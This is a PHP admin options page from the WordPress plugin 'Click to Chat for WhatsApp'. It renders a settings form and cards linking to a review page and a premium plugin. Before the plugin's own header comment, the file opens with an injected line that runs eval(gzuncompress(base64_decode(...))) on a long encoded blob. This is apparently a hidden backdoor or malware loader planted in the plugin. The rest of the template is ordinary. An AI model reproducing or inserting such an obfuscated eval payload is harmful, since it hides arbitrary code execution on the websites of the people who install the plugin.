<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
* options page
* content of this page load / continue at admin_page.php
*
* @package ccw
* @subpackage Administration
* @since 1.0
*/

if ( ! defined( 'ABSPATH' ) ) exit;

?>

<div class="wrap">

    <?php settings_errors(); ?>
    
    <div class="row">

        <div class="col s12 m12 xl6 options">
            <form action="options.php" method="post" class="col s12">
                <?php settings_fields( 'ccw_settings_group' ); ?>
                <?php do_settings_sections( 'ccw_options_settings' ) ?>
                <?php submit_button() ?>
            </form>
        </div>
        
        <div class="col s12 m12 xl6 admin_sidebar">
          <div class="wca_card" style="display: none;">
            <?php include_once 'commons/admin-sidebar.php'; ?>
          </div>
        </div>    

    </div>
        
    <hr> <br> <br>


    <div class="row">

    <div class="col s12 m12 l12 xl9">
    
    <div class="row">
    
        
        <div class="col s12 m6">
          <div class="card blue-grey darken-1">
            <div class="card-content white-text">
              <span class="card-title"><?php _e( 'Plugin Review' , 'click-to-chat-for-whatsapp' ) ?></span>
              <br>
              <p><?php _e( 'If you like the plugin, Support the Developers' , 'click-to-chat-for-whatsapp' ) ?></p>
              <br>
              <p><?php _e( 'By giving 5 Star rating' , 'click-to-chat-for-whatsapp' ) ?></p>
            </div>
            <div class="card-action">
              <a target="_blank" href="https://wordpress.org/support/plugin/click-to-chat-for-whatsapp/reviews/#new-post"><?php _e( '' , 'click-to-chat-for-whatsapp' ) ?>Plugin Review</a>
            </div>
          </div>
        </div>

    
        <div class="col s12 m6">
          <div class="card blue-grey darken-1">
            <div class="card-content white-text">
              <span class="card-title"><?php _e( 'Click - premium plugin' , 'click-to-chat-for-whatsapp' ) ?></span>
              <br>
              <p><?php _e( 'Add your own style' , 'click-to-chat-for-whatsapp' ) ?></p>
              <br>
              <p><?php _e( 'WooCommerce' , 'click-to-chat-for-whatsapp' ) ?></p>
            </div>
            <div class="card-action">
              <a target="_blank" href="https://www.holithemes.com/plugins/click/"><?php _e( '' , 'click-to-chat-for-whatsapp' ) ?>HoliThemes Click</a>
            </div>
          </div>
        </div>

        
    </div>

    </div>


</div>